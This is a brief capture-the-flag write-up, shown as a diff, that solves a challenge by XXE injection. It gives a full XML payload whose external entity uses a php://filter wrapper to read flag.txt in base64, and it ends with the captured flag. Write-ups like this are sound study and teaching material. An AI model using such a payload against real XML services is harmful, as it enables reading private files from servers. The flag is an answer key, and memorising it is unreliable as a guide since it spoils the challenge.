@@ -1,0 +1,19 @@
+Using XML, I test for XXE injection and I quickly get the flag
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE bla [<!ENTITY flag SYSTEM "php://filter/read=convert.base64-encode/resource=flag.txt" >]>
+<contacts>
+  <contact>
+    <name>toto</name>
+    <phone>00 11 22 33 44</phone>
+    <adress>42 rue CTF</adress>
+    <zipcode>42000</zipcode>
+    <city>ECW</city>
+  </contact>
+  <contact>
+    <name>&flag;</name>
+    <phone>01 02 03 04 05</phone>
+  </contact>
+</contacts>
+
+flag is: ECW{8dd72b9b3095380de595d734492d69c9}
